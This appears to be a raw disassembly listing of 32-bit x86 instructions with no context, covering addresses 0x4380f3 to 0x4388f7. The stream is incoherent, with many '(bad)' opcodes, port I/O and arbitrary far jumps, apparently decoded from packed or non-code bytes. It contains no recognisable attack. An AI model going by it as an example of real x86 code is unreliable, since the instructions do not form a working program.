  4380f3:	mov    ch,0xe6
  4380f5:	sar    DWORD PTR [ecx+0x5e],0xaf
  4380f9:	mov    ds:0xcec563fd,eax
  4380fe:	xchg   al,ah
  438100:	jge    0x43809e
  438102:	mov    edx,0x9ca83834
  438107:	push   cs
  438108:	jne    0x4380aa
  43810a:	std    
  43810b:	out    dx,eax
  43810c:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43810e:	addr16 repz sbb eax,0xef122d19
  438115:	xchg   esi,eax
  438116:	jle    0x4380aa
  438118:	push   esi
  438119:	cmc    
  43811a:	push   edx
  43811b:	(bad)  
  43811c:	cmc    
  43811d:	sub    al,0x72
  43811f:	out    dx,eax
  438120:	add    DWORD PTR [edi-0x59],ebx
  438123:	adc    eax,0xeb73d918
  438128:	and    BYTE PTR [ebx],al
  43812a:	or     DWORD PTR [edx+0x7d],ebx
  43812d:	jns    0x4381ad
  43812f:	mov    ebp,0xa8cb9d6a
  438134:	dec    edi
  438135:	inc    esp
  438136:	jb     0x43814e
  438138:	sbb    cl,BYTE PTR [ecx-0x70898ad3]
  43813e:	adc    edx,ebx
  438140:	(bad)  
  438141:	pushf  
  438142:	fstp   TBYTE PTR [ecx+0x736798]
  438148:	addps  xmm2,XMMWORD PTR [ecx]
  43814b:	js     0x43813e
  43814d:	popa   
  43814e:	mov    al,0x44
  438150:	std    
  438151:	out    dx,al
  438152:	shl    BYTE PTR [eax-0x73],1
  438155:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  438156:	retf   
  438157:	pushf  
  438158:	repnz lea esp,ds:[ecx+0x5d0b8086]
  438160:	xor    dh,0xb9
  438163:	test   bl,bl
  438165:	stos   BYTE PTR es:[edi],al
  438166:	cmp    al,0x49
  438168:	dec    ecx
  438169:	push   DWORD PTR ds:0x2ba8e9ac
  43816f:	out    0xc7,al
  438171:	sbb    al,0xac
  438173:	jmp    DWORD PTR [ecx+ebx*2]
  438176:	aaa    
  438177:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  438178:	rcl    DWORD PTR [ebp-0x5b63ccd3],cl
  43817e:	stos   DWORD PTR es:[edi],eax
  43817f:	ror    dh,0x3f
  438182:	repz fistp WORD PTR [edx+0x10f5be2f]
  438189:	sar    BYTE PTR [edi-0x321d0cac],0xaf
  438190:	lds    ebx,FWORD PTR [eax-0x69e01146]
  438196:	sar    DWORD PTR [edx+0x79],1
  438199:	ficomp DWORD PTR [eax]
  43819b:	sbb    al,BYTE PTR ds:0x46680c14
  4381a1:	shl    BYTE PTR [edi-0x3a],cl
  4381a4:	popf   
  4381a5:	mov    ax,si
  4381a8:	sbb    ebp,DWORD PTR [ecx]
  4381aa:	push   ss
  4381ab:	cmp    BYTE PTR [ebx-0x38],bl
  4381ae:	fild   WORD PTR [ecx-0x5fed2690]
  4381b4:	pop    ebp
  4381b5:	je     0x43813a
  4381b7:	mov    eax,DWORD PTR [ebp+0x69e98f94]
  4381bd:	pop    ebx
  4381be:	(bad)  
  4381bf:	pop    edx
  4381c0:	cwde   
  4381c1:	nop
  4381c2:	sbb    al,0xad
  4381c4:	push   ds
  4381c5:	fst    DWORD PTR ds:0xd9c7e4d4
  4381cb:	push   ds
  4381cc:	ror    DWORD PTR [esi-0x30],1
  4381cf:	jecxz  0x438237
  4381d1:	or     al,0x89
  4381d3:	(bad)  [ebx]
  4381d5:	sub    DWORD PTR [esi-0x2d],eax
  4381d8:	dec    ebp
  4381d9:	mov    esi,0x53e52771
  4381de:	mov    dh,0x54
  4381e0:	pop    ecx
  4381e1:	les    ebp,FWORD PTR [edi+eiz*4-0x14b1fbfb]
  4381e8:	popa   
  4381e9:	retf   
  4381ea:	fisttp QWORD PTR [eax-0x7e06e6e9]
  4381f0:	xchg   ebp,eax
  4381f1:	mov    esi,0x9dbdfa79
  4381f6:	or     ebp,DWORD PTR [esi+edx*1]
  4381f9:	add    al,0x60
  4381fb:	outs   dx,BYTE PTR ds:[esi]
  4381fc:	mov    esi,0xf57e9685
  438201:	movsx  esp,WORD PTR [ebp+ebx*1+0x28]
  438206:	and    bh,BYTE PTR [ebp+eax*1+0x76]
  43820a:	adc    eax,0xecb206e6
  43820f:	popf   
  438210:	aas    
  438211:	mov    ecx,0xc367ab67
  438216:	sahf   
  438217:	adc    BYTE PTR [ebx-0x1c],0x27
  43821b:	jmp    0xec98b265
  438220:	aad    0xd0
  438222:	clc    
  438223:	ret    
  438224:	push   es
  438225:	mov    edx,0x944c30ab
  43822a:	push   cs
  43822b:	xchg   esi,eax
  43822c:	and    eax,0x2bf15c1
  438231:	push   ebp
  438232:	xor    BYTE PTR [ecx+0x15],ah
  438235:	inc    esp
  438236:	cwde   
  438237:	jmp    0x438211
  438239:	outs   dx,BYTE PTR ds:[esi]
  43823a:	rcl    BYTE PTR [esi+0x1e],cl
  43823d:	leave  
  43823e:	dec    ebx
  43823f:	popa   
  438240:	xchg   esi,eax
  438241:	cmp    esi,DWORD PTR [ebx+ebp*1]
  438244:	jnp    0x4381ca
  438246:	dec    esp
  438247:	and    al,0xf9
  438249:	ret    
  43824a:	xchg   esp,eax
  43824b:	fnsave [edi+0x1aeeb6bc]
  438251:	jns    0x4381f8
  438253:	nop
  438254:	xor    eax,0x32a3ea24
  438259:	retf   0xc83b
  43825c:	and    eax,0xa2a709b3
  438261:	(bad)
  438264:	dec    ebp
  438265:	fnstenv [eax-0x33]
  438268:	imul   esi,DWORD PTR [ebp+esi*2+0x7e2524db],0x71
  438270:	test   edi,esp
  438272:	fsub   st(7),st
  438274:	cmp    eax,0x4c062b0d
  438279:	or     DWORD PTR [ecx+0xe],ebx
  43827c:	daa    
  43827d:	ss add eax,0x21b2e079
  438283:	jmp    0x6af9:0xbd56b5e9
  43828a:	lds    edi,FWORD PTR [edx+edx*2-0x58]
  43828e:	ja     0x438261
  438290:	sbb    al,0x19
  438292:	or     ecx,DWORD PTR [edi+eax*8]
  438295:	dec    edx
  438296:	pop    DWORD PTR [edi+0x76]
  438299:	cmp    edi,DWORD PTR [ebx-0x7a87a604]
  43829f:	jl     0x4382d1
  4382a1:	xor    DWORD PTR [ebx],edi
  4382a3:	and    BYTE PTR [edi-0xc576239],al
  4382a9:	mov    BYTE PTR [ebp+ebp*8-0x2f],dh
  4382ad:	xchg   ecx,eax
  4382ae:	jecxz  0x438304
  4382b0:	and    BYTE PTR cs:[edi+eiz*8],ah
  4382b4:	or     al,0x68
  4382b6:	popf   
  4382b7:	pop    esp
  4382b8:	jp     0x43825e
  4382ba:	das    
  4382bb:	gs (bad) 
  4382bd:	rol    DWORD PTR [eax+0x265953aa],1
  4382c3:	sub    al,0x76
  4382c5:	sbb    ebx,DWORD PTR [edi-0x7295b13d]
  4382cb:	jno    0x438303
  4382cd:	push   cs
  4382ce:	jbe    0x4382a3
  4382d0:	sbb    al,0x81
  4382d2:	or     DWORD PTR [edi+0x3c994429],0x1971a546
  4382dc:	clc    
  4382dd:	pushf  
  4382de:	sbb    al,0xf8
  4382e0:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4382e2:	jg     0x438300
  4382e4:	cli    
  4382e5:	sbb    dl,BYTE PTR [eax]
  4382e7:	fimul  WORD PTR [esi+0x236ccb1c]
  4382ed:	jmp    0xf975c4f1
  4382f2:	setge  BYTE PTR [eax-0x61]
  4382f6:	sti    
  4382f7:	xchg   ebp,eax
  4382f8:	sbb    BYTE PTR [ebx-0x57a0ceba],0x80
  4382ff:	call   0x9deb:0x44ec7b50
  438306:	cmc    
  438307:	ja     0x4382de
  438309:	mov    eax,ds:0x4a822fb
  43830e:	scas   eax,DWORD PTR es:[edi]
  43830f:	mov    ebp,0x185aa249
  438314:	jnp    0x438367
  438316:	mov    edx,0x303cdb64
  43831b:	stos   DWORD PTR es:[edi],eax
  43831c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43831d:	mov    al,ds:0xfb41ce3d
  438322:	addr16 out dx,eax
  438324:	push   0xffffffb5
  438326:	sbb    ebp,DWORD PTR [esp+ebx*1+0x64]
  43832a:	mov    al,0xb4
  43832c:	test   eax,0xa61d3044
  438331:	push   es
  438332:	jne    0x438306
  438334:	and    DWORD PTR ds:0x7f56deee,edi
  43833a:	mov    dh,al
  43833c:	jns    0x438347
  43833e:	mov    dh,0x4
  438340:	in     al,dx
  438341:	sub    DWORD PTR ds:[ebp+esi*2-0x2f],esp
  438346:	push   0xffffffe5
  438348:	aaa    
  438349:	xchg   edi,eax
  43834a:	arpl   sp,bx
  43834c:	cmp    DWORD PTR [ebx-0x17],0x6f
  438350:	pop    ss
  438351:	sbb    DWORD PTR [ebx],edi
  438353:	nop
  438354:	clc    
  438355:	shr    BYTE PTR [ebp-0x12],0xd5
  438359:	mov    ah,0x73
  43835b:	in     eax,0x5
  43835d:	lahf   
  43835e:	jg     0x43833d
  438360:	pop    ds
  438361:	mov    DWORD PTR [esi],edx
  438363:	xlat   BYTE PTR ds:[ebx]
  438364:	mov    dl,BYTE PTR [ebx-0x65b738f4]
  43836a:	jmp    0x4383c4
  43836c:	cwde   
  43836d:	(bad)  
  43836f:	shl    DWORD PTR [ebx],0x21
  438372:	cli    
  438373:	shl    DWORD PTR [ecx-0x6d],1
  438376:	mov    bl,0x4
  438378:	inc    ebx
  438379:	xchg   edx,eax
  43837a:	js     0x43835f
  43837c:	xchg   ebp,eax
  43837d:	mov    ds:0xd404ee36,eax
  438382:	inc    ecx
  438383:	popf   
  438384:	sbb    bl,BYTE PTR [ecx]
  438386:	imul   DWORD PTR [esi]
  438388:	imul   esi,DWORD PTR [eax+0x65914564],0x7e
  43838f:	stos   DWORD PTR es:[edi],eax
  438390:	push   ds
  438391:	fwait
  438392:	sub    edx,DWORD PTR [esp+ebp*2+0x202cb76b]
  438399:	cdq    
  43839a:	inc    edi
  43839b:	mov    esi,esp
  43839d:	jecxz  0x4383aa
  43839f:	lahf   
  4383a0:	xchg   ecx,eax
  4383a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4383a2:	mov    ebx,0x38c03828
  4383a7:	test   DWORD PTR [ebp+0x7a],esp
  4383aa:	xor    ch,0x26
  4383ad:	mov    al,ds:0xeae5eca4
  4383b2:	cmp    dh,al
  4383b4:	cs jmp 0x394a80da
  4383ba:	(bad)  
  4383bc:	xchg   ecx,eax
  4383bd:	retf   0xbabb
  4383c0:	adc    esi,DWORD PTR [ebx]
  4383c2:	xlat   BYTE PTR ds:[ebx]
  4383c3:	and    DWORD PTR [eax+0x21446553],0x39
  4383ca:	popf   
  4383cb:	mov    esi,0x42db11e3
  4383d0:	dec    edx
  4383d1:	outs   dx,DWORD PTR ds:[esi]
  4383d2:	pop    edi
  4383d3:	stos   BYTE PTR es:[edi],al
  4383d4:	push   ds
  4383d5:	xor    ebx,ebx
  4383d7:	adc    al,0x78
  4383d9:	imul   ebp,DWORD PTR [ebp-0x3a],0x20
  4383dd:	test   DWORD PTR [ebx],eax
  4383df:	jmp    0xd203e8c4
  4383e4:	test   DWORD PTR [edx],ecx
  4383e6:	mov    eax,0x4479e7e7
  4383eb:	ds sbb eax,0x2b599189
  4383f1:	loope  0x43844c
  4383f3:	mov    bh,0x77
  4383f5:	sub    ah,0x0
  4383f8:	fdivr  QWORD PTR [ecx+0x394cb156]
  4383fe:	mov    bh,0x68
  438400:	sbb    al,0x69
  438402:	xchg   esp,eax
  438403:	pop    ebx
  438404:	stos   BYTE PTR es:[edi],al
  438405:	and    esi,DWORD PTR [ebp-0x58]
  438408:	mov    al,0xd4
  43840a:	or     ebx,DWORD PTR [esi]
  43840c:	adc    BYTE PTR [esi],0xd3
  43840f:	fs pop ss
  438411:	loope  0x438423
  438413:	enter  0x891e,0x68
  438417:	xor    edi,ebx
  438419:	jecxz  0x438400
  43841b:	lock call 0xd1bf:0x67435ba2
  438423:	repnz mov eax,0x1a3308d8
  438429:	leave  
  43842a:	mov    bh,0xdd
  43842c:	sbb    esi,eax
  43842e:	xor    eax,0x7bd4cd4a
  438433:	int3   
  438434:	jb     0x43848a
  438436:	add    ecx,edi
  438438:	sbb    dh,BYTE PTR [esi+0x2f]
  43843b:	sub    al,0x23
  43843d:	mov    esp,ecx
  43843f:	jge    0x43842d
  438441:	cmp    ebx,0xfbb948e9
  438447:	sbb    al,0x49
  438449:	or     cl,BYTE PTR [ebx-0x5ccae95a]
  43844f:	jl     0xe8d18f4e
  438455:	mov    dl,0x9b
  438457:	jmp    FWORD PTR [ecx-0x4d]
  43845a:	mov    al,0x17
  43845c:	or     al,0x7f
  43845e:	mov    ecx,gs
  438460:	xchg   ebx,eax
  438461:	push   0xffffffa8
  438463:	sti    
  438464:	and    BYTE PTR [ecx-0x3f],0x98
  438468:	push   ebp
  438469:	inc    esi
  43846a:	push   edx
  43846b:	lods   eax,DWORD PTR ds:[esi]
  43846c:	das    
  43846d:	fbstp  TBYTE PTR [eax+0x5690d6c4]
  438473:	push   0xef43ad25
  438478:	cdq    
  438479:	pop    eax
  43847a:	and    esp,edx
  43847c:	and    bh,BYTE PTR [ecx]
  43847e:	data16 and BYTE PTR [ecx],dl
  438481:	test   al,0x9f
  438483:	(bad)  
  438485:	cmp    DWORD PTR [edx+eiz*8],0x51a5aee3
  43848c:	aad    0x1c
  43848e:	mov    ch,0xcc
  438490:	sbb    al,0x59
  438492:	ret    
  438493:	fstp   st(2)
  438495:	mov    ebx,esp
  438497:	fucomip st,st(1)
  438499:	xchg   esi,eax
  43849a:	or     al,0x8a
  43849c:	test   DWORD PTR [edx],ebp
  43849e:	xor    BYTE PTR [ecx+0x14bc4710],bl
  4384a4:	and    al,0xf9
  4384a6:	xor    edx,edx
  4384a8:	out    dx,eax
  4384a9:	scas   eax,DWORD PTR es:[edi]
  4384aa:	popa   
  4384ab:	xor    ch,BYTE PTR [esi-0x7a]
  4384ae:	stos   BYTE PTR es:[edi],al
  4384af:	aas    
  4384b0:	jne    0x43846e
  4384b2:	scas   al,BYTE PTR es:[edi]
  4384b3:	out    0xa1,al
  4384b5:	ret    
  4384b6:	or     BYTE PTR [edi+0x16],dl
  4384b9:	mov    DWORD PTR [eax-0x65272dc6],edx
  4384bf:	sub    eax,0x1dac7ba9
  4384c4:	fistp  WORD PTR [ecx+edi*2+0x29]
  4384c8:	sbb    eax,0x5382be26
  4384cd:	jns    0x438451
  4384cf:	and    al,0xd8
  4384d1:	mov    ds,WORD PTR [eax+0x20]
  4384d4:	bound  esi,QWORD PTR [ecx+edx*2]
  4384d7:	in     al,dx
  4384d8:	adc    al,0x7f
  4384da:	pop    ds
  4384db:	mov    DWORD PTR [esi],edx
  4384dd:	add    DWORD PTR [eax],ebx
  4384df:	mov    ds:0xd41d256a,al
  4384e4:	or     ebx,ecx
  4384e6:	popa   
  4384e7:	stc    
  4384e8:	sbb    cl,BYTE PTR [ecx-0x5b]
  4384eb:	xor    eax,0x7a4fbd91
  4384f0:	adc    eax,0x5e7d7cf
  4384f5:	dec    eax
  4384f6:	pop    edx
  4384f7:	fsubr  QWORD PTR [ebx]
  4384f9:	jmp    0x98360d89
  4384fe:	mov    ecx,0x8eb722a6
  438503:	adc    DWORD PTR [eax],ebx
  438505:	sub    BYTE PTR [esi+0x72],dh
  438508:	pop    ss
  438509:	and    DWORD PTR [ebp+0x6e],0x6c4e72dd
  438510:	or     esp,DWORD PTR [ebx-0x393dc7ad]
  438516:	ror    BYTE PTR [edx+0x48],cl
  438519:	ror    DWORD PTR [ebx],1
  43851b:	aam    0x56
  43851d:	push   0xe524e648
  438522:	and    eax,0xc80af58a
  438527:	dec    eax
  438528:	and    al,0xe1
  43852a:	sub    BYTE PTR [esi],bl
  43852c:	call   0xf66b:0xd5b8d3c2
  438533:	out    0xf6,al
  438535:	fstp   DWORD PTR [edi+0x35]
  438538:	mov    ecx,0x13fe9858
  43853d:	aad    0xbb
  43853f:	xor    al,0x3c
  438541:	fild   WORD PTR [edi]
  438543:	inc    ch
  438545:	pop    ecx
  438546:	and    dh,ch
  438548:	and    eax,0x22264828
  43854d:	mov    ebx,edx
  43854f:	aaa    
  438550:	adc    DWORD PTR [ebx-0x1f],ebp
  438553:	mov    cl,al
  438555:	popf   
  438556:	dec    ebx
  438557:	dec    esi
  438558:	xor    BYTE PTR [edi-0x78d26a8d],bl
  43855e:	dec    esp
  43855f:	mov    al,0x39
  438561:	sbb    eax,0x423344b5
  438566:	popf   
  438567:	adc    DWORD PTR [ebx+0x36731a7f],ecx
  43856d:	adc    BYTE PTR [eiz*2-0x18bf677d],ah
  438574:	(bad)  
  438576:	fcmovne st,st(5)
  438578:	fs popf 
  43857a:	xchg   edi,eax
  43857b:	mov    esp,0x276e1263
  438580:	inc    esp
  438581:	jge    0x4385ed
  438583:	mov    ch,dh
  438585:	push   esp
  438586:	add    eax,0x704094f0
  43858b:	hlt    
  43858c:	push   ds
  43858d:	sbb    DWORD PTR [edx],ecx
  43858f:	dec    edi
  438590:	push   esp
  438591:	es mov esi,0xeba6ed50
  438597:	(bad)  
  438598:	loope  0x438559
  43859a:	pop    esp
  43859b:	add    al,0xcc
  43859d:	je     0x438595
  43859f:	inc    ecx
  4385a0:	and    BYTE PTR [edx+0x32e964b3],ah
  4385a6:	bound  edi,QWORD PTR [edx+0x555cb176]
  4385ac:	jnp    0x438555
  4385ae:	pushf  
  4385af:	jbe    0x438622
  4385b1:	mov    dl,BYTE PTR [eax+0x492f5c39]
  4385b7:	test   DWORD PTR ds:0xc3f05adc,eax
  4385bd:	jae    0x43854e
  4385bf:	dec    eax
  4385c0:	and    eax,DWORD PTR [ecx-0xe3ec3ce]
  4385c6:	sub    ebp,DWORD PTR [ebp+0x21]
  4385c9:	test   eax,0xa5ea92a2
  4385ce:	jbe    0x438587
  4385d0:	sbb    ah,BYTE PTR [ebp+0x139960fb]
  4385d6:	pop    ss
  4385d7:	lods   al,BYTE PTR ds:[esi]
  4385d8:	pop    edi
  4385d9:	(bad)  
  4385db:	fimul  WORD PTR [ebp+0x39]
  4385de:	mov    ebx,0x59c130eb
  4385e3:	and    eax,DWORD PTR [eax]
  4385e5:	pop    ebp
  4385e6:	xor    DWORD PTR [ecx+0x35],0xb2edeed2
  4385ed:	out    dx,eax
  4385ee:	and    eax,0x7f891e27
  4385f3:	icebp  
  4385f4:	sub    ax,WORD PTR fs:[ebx-0x5a]
  4385f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4385fa:	retf   
  4385fb:	jmp    0x6a63:0xc90b73f7
  438602:	pop    edi
  438603:	fst    DWORD PTR [edi]
  438605:	pop    edi
  438606:	mov    ecx,0xeb9bc9b0
  43860b:	inc    ebx
  43860c:	mov    edi,0xf7933058
  438611:	mov    BYTE PTR [esp+ebp*8+0x5a7be4a1],bl
  438618:	outs   dx,BYTE PTR ds:[esi]
  438619:	pop    ecx
  43861a:	jmp    0xb5263873
  43861f:	and    BYTE PTR [ebp+0x7b],al
  438622:	into   
  438623:	jmp    0x43865e
  438625:	mov    esi,esi
  438627:	sub    edi,DWORD PTR [esi+0x50]
  43862a:	jmp    0xb30d5336
  43862f:	aam    0xbc
  438631:	mov    ds:0x6f56a54,al
  438636:	imul   dl
  438638:	std    
  438639:	push   ecx
  43863a:	lahf   
  43863b:	xchg   ebx,eax
  43863c:	and    DWORD PTR [ecx-0x74b9f825],edi
  438642:	push   esp
  438643:	(bad)  
  438644:	sbb    al,0x9f
  438646:	retf   
  438647:	dec    edx
  438648:	ins    DWORD PTR es:[edi],dx
  438649:	adc    ecx,0x29fca3fb
  43864f:	mov    DWORD PTR [ebp+0x19],ebx
  438652:	mov    esi,edx
  438654:	fnstsw WORD PTR [edx+0x48]
  438657:	shl    BYTE PTR ds:0x8cdb2c5,1
  43865d:	fisub  DWORD PTR [edi+0xe]
  438660:	aad    0x8
  438662:	mov    eax,0x43f566ef
  438667:	jae    0x4386d9
  438669:	ror    BYTE PTR [ecx-0xbe6e904],1
  43866f:	rcl    DWORD PTR ds:0xc34043d5,cl
  438675:	popf   
  438676:	fild   DWORD PTR [ebx-0x3e]
  438679:	sbb    al,0xe2
  43867b:	aam    0x2d
  43867d:	inc    eax
  43867e:	push   ss
  43867f:	in     al,dx
  438680:	ss jne 0x438636
  438683:	mov    ah,0x84
  438685:	hlt    
  438686:	into   
  438687:	push   ds
  438688:	add    eax,0x6eee1df3
  43868d:	and    al,dh
  43868f:	mov    eax,ds:0x404f2917
  438694:	add    BYTE PTR [ecx-0x5fd31c29],al
  43869a:	or     esp,DWORD PTR [edx-0xb]
  43869d:	test   DWORD PTR [edx],esi
  43869f:	ret    
  4386a0:	xchg   ecx,eax
  4386a1:	lea    ebx,[ebp-0x4a68ad59]
  4386a7:	aam    0x31
  4386a9:	mov    eax,0xaa53ca9
  4386ae:	mov    bl,0xf1
  4386b0:	je     0x4386c7
  4386b2:	pop    ss
  4386b3:	lods   al,BYTE PTR ds:[esi]
  4386b4:	mov    ebx,0x23d32957
  4386b9:	xchg   ecx,eax
  4386ba:	mov    edx,0x9be55954
  4386bf:	push   ebx
  4386c0:	idiv   BYTE PTR [edi+0x78]
  4386c3:	or     al,0xc5
  4386c5:	and    esp,DWORD PTR [ecx+0x23]
  4386c8:	fwait
  4386c9:	adc    esp,DWORD PTR [eax-0x65372a14]
  4386cf:	in     eax,0x72
  4386d1:	aad    0x6e
  4386d3:	pop    esp
  4386d4:	in     eax,dx
  4386d5:	fcmovbe st,st(7)
  4386d7:	mov    ebx,0xb800211e
  4386dc:	hlt    
  4386dd:	push   esi
  4386de:	dec    esp
  4386df:	push   0xffffffc5
  4386e1:	cmp    ch,BYTE PTR [eax+ebp*8-0x40]
  4386e5:	stos   BYTE PTR es:[edi],al
  4386e6:	mov    bh,0x8
  4386e8:	or     ch,bl
  4386ea:	ficomp WORD PTR [ebx-0x42]
  4386ed:	jb     0x4386ed
  4386ef:	add    BYTE PTR [esi-0x28b38e9f],al
  4386f5:	sub    cl,cl
  4386f7:	add    ch,dh
  4386f9:	stos   DWORD PTR es:[edi],eax
  4386fa:	cmp    esi,0xffffff9b
  4386fd:	sub    al,0x99
  4386ff:	dec    esi
  438700:	gs dec ebx
  438702:	pop    es
  438703:	gs push cs
  438705:	cld    
  438706:	mov    ch,0x64
  438708:	pop    edx
  438709:	sub    cl,dh
  43870b:	mov    DWORD PTR [ecx-0x76],edi
  43870e:	jg     0x438697
  438710:	xchg   ebp,eax
  438711:	xor    eax,0xd9019cb4
  438716:	leave  
  438717:	enter  0xf215,0xed
  43871b:	je     0x43871f
  43871d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43871e:	xchg   edi,eax
  43871f:	dec    ebp
  438720:	inc    esp
  438721:	call   0x827b:0xd13bcabb
  438728:	inc    BYTE PTR [edx+0x6b46260d]
  43872e:	mov    bh,0x34
  438730:	mov    esi,DWORD PTR ds:0x2d49f729
  438736:	pop    ss
  438737:	jne    0x4387a4
  438739:	aad    0xb4
  43873b:	in     al,dx
  43873c:	or     eax,0x83637a83
  438741:	mov    edx,0xa51fa503
  438746:	ja     0x4386d4
  438748:	xchg   ah,cl
  43874a:	dec    ebx
  43874b:	pop    ebx
  43874c:	xchg   ecx,eax
  43874d:	jle    0x438720
  43874f:	out    dx,eax
  438750:	and    edx,edx
  438752:	mov    cl,0xce
  438754:	ds jmp 0x29ffd050
  43875a:	repnz mov bh,0xab
  43875d:	adc    ebp,DWORD PTR [edx]
  43875f:	out    0x25,eax
  438761:	adc    eax,edx
  438763:	jmp    0x438748
  438765:	cdq    
  438766:	shl    BYTE PTR [eax-0x73],1
  438769:	jns    0x43879d
  43876b:	sar    DWORD PTR [edx+0x213912c3],0xb3
  438772:	and    bl,dl
  438774:	gs call 0x97e4:0x3d33c22b
  43877c:	sub    al,0xca
  43877e:	mov    dl,0xdf
  438780:	sub    eax,0xf374b4a3
  438785:	lds    ebx,FWORD PTR [esi]
  438787:	push   0xc6116ed9
  43878c:	lods   al,BYTE PTR fs:[esi]
  43878e:	mov    eax,0xaee9f1ac
  438793:	mov    bl,0x49
  438795:	icebp  
  438796:	mov    ebx,0xd8be8a4
  43879b:	cmp    ah,BYTE PTR ds:0x32ee0419
  4387a1:	sbb    eax,0x791dc742
  4387a6:	daa    
  4387a7:	inc    esp
  4387a8:	push   ss
  4387a9:	mov    esp,0xe1e484e9
  4387ae:	sti    
  4387af:	inc    ecx
  4387b0:	mov    ss,WORD PTR [esi+0x23]
  4387b3:	outs   dx,DWORD PTR ds:[esi]
  4387b4:	inc    ecx
  4387b5:	inc    edx
  4387b6:	jb     0x4387ab
  4387b8:	daa    
  4387b9:	jns    0x438781
  4387bb:	clc    
  4387bc:	int    0x6e
  4387be:	or     esp,DWORD PTR [ebp+eiz*4+0x65]
  4387c2:	ror    BYTE PTR [ebx],cl
  4387c4:	add    eax,0xa9efbeb6
  4387c9:	out    dx,eax
  4387ca:	jbe    0x438788
  4387cc:	loope  0x438758
  4387ce:	cmp    ecx,edi
  4387d0:	and    BYTE PTR [ecx],bh
  4387d2:	and    bl,ch
  4387d4:	push   ss
  4387d5:	mov    ah,0xf5
  4387d7:	sar    BYTE PTR [ebp+0x78],1
  4387da:	popf   
  4387db:	push   ebx
  4387dc:	popf   
  4387dd:	aam    0x34
  4387df:	or     edx,DWORD PTR [ebp-0x58]
  4387e2:	mov    edi,0xf39f22e6
  4387e7:	dec    ebx
  4387e8:	fcom   DWORD PTR [eax-0x6]
  4387eb:	inc    edx
  4387ec:	push   ecx
  4387ed:	mov    ebx,0x9343485a
  4387f2:	out    dx,eax
  4387f3:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4387f5:	pop    edi
  4387f6:	mov    ebx,0xd6161ce4
  4387fb:	loope  0x438823
  4387fd:	mov    WORD PTR [ebp-0x1f],?
  438800:	dec    esp
  438801:	inc    edi
  438802:	(bad)  
  438803:	jmp    0x43879b
  438805:	popa   
  438806:	jo     0x4387e7
  438808:	(bad)  
  43880a:	xor    bl,BYTE PTR [eax-0x684655f]
  438810:	inc    ebx
  438811:	es xchg ecx,eax
  438813:	and    al,0x5c
  438815:	adc    cl,BYTE PTR [esi+ecx*8-0x47]
  438819:	in     eax,dx
  43881a:	retf   0xbf48
  43881d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43881e:	adc    DWORD PTR [ebx+0x78],ebx
  438821:	mov    ss,WORD PTR [edx]
  438823:	xor    edx,DWORD PTR [edx]
  438825:	mov    ds:0xd5ef74b0,eax
  43882a:	retf   
  43882b:	pushf  
  43882c:	mov    ch,0x63
  43882e:	jle    0x438829
  438830:	push   ss
  438831:	call   0xebb6:0xaddb5bfa
  438838:	sbb    BYTE PTR [ecx-0x7e52e3a2],cl
  43883e:	out    0x10,eax
  438840:	cmp    al,0x9b
  438842:	sbb    ecx,DWORD PTR [edx]
  438844:	aam    0xba
  438846:	fwait
  438847:	mov    edx,0x3da13d39
  43884c:	enter  0xc008,0x84
  438850:	cld    
  438851:	inc    esi
  438852:	push   ebx
  438853:	outs   dx,DWORD PTR ds:[esi]
  438854:	mov    ch,0x46
  438856:	or     al,0xc4
  438858:	sub    DWORD PTR [edx],0x2fffb17c
  43885e:	jno    0x4387f1
  438860:	sar    DWORD PTR [ebx],cl
  438862:	mov    dl,0x8c
  438864:	lahf   
  438865:	outs   dx,BYTE PTR ds:[esi]
  438866:	loope  0x4388ae
  438868:	adc    eax,0x5deccded
  43886d:	xchg   ebp,eax
  43886e:	add    ah,BYTE PTR [edx]
  438870:	(bad)  
  438871:	sub    al,0xdb
  438873:	aas    
  438874:	push   0x13
  438876:	mov    esp,0x2c9b1701
  43887b:	xchg   edx,eax
  43887c:	cdq    
  43887d:	pop    ebp
  43887e:	xchg   esi,eax
  43887f:	dec    eax
  438880:	das    
  438881:	xlat   BYTE PTR ds:[ebx]
  438882:	es xor eax,0xb2ec9a1d
  438888:	out    dx,al
  438889:	lahf   
  43888a:	imul   ebp,DWORD PTR [eax+0x1b],0xffffff9e
  43888e:	xchg   esp,ebp
  438890:	mov    dl,0xd
  438892:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  438893:	adc    ah,bl
  438895:	dec    esp
  438896:	aaa    
  438897:	repz push ebp
  438899:	xor    DWORD PTR [edx-0x12],ecx
  43889c:	dec    esp
  43889e:	shr    DWORD PTR [eax],cl
  4388a0:	add    eax,0xf8f01f18
  4388a5:	rcl    DWORD PTR [ecx-0x1],0x16
  4388a9:	sub    edi,eax
  4388ab:	mov    ch,0xa2
  4388ad:	jns    0x4388cf
  4388af:	fld    QWORD PTR [edx]
  4388b1:	popf   
  4388b2:	pop    ebx
  4388b3:	cmp    DWORD PTR [edi],esi
  4388b5:	sti    
  4388b6:	sbb    dl,BYTE PTR [ecx]
  4388b8:	mov    eax,?
  4388ba:	enter  0xd201,0x84
  4388be:	mov    bl,0xc4
  4388c0:	dec    esi
  4388c1:	out    0x2e,al
  4388c3:	ss jbe 0x438930
  4388c6:	mov    ebx,DWORD PTR [edx+0x1a]
  4388c9:	loop   0x438888
  4388cb:	adc    ecx,ebp
  4388cd:	adc    esi,esi
  4388cf:	repz fstp st(6)
  4388d2:	and    dl,BYTE PTR [edi+eiz*8-0xa3abc56]
  4388d9:	pop    ecx
  4388da:	mov    esp,0xeba75a78
  4388df:	mov    ch,0x10
  4388e1:	arpl   WORD PTR [ecx-0x46],ax
  4388e4:	imul   ebx,DWORD PTR [edi+0x30],0x1a
  4388e8:	dec    ebp
  4388e9:	inc    edx
  4388ea:	fist   DWORD PTR [esp+eiz*4]
  4388ed:	popf   
  4388ee:	pop    ecx
  4388ef:	add    bl,cl
  4388f1:	pushf  
  4388f2:	imul   edi,eax,0xffffffba
  4388f5:	pop    es
  4388f6:	clc    
  4388f7:	out    0xd8,al
